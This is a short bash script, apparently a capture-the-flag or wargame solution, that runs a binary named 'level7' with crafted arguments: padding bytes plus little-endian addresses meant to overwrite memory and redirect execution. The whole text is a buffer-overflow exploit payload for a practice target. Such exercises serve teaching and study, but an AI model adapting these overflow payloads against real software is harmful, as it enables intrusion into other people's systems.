#!/bin/bash
./level7 $(python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1])") $(python -c "print('\x08\x04\x84\xf4'[::-1])")
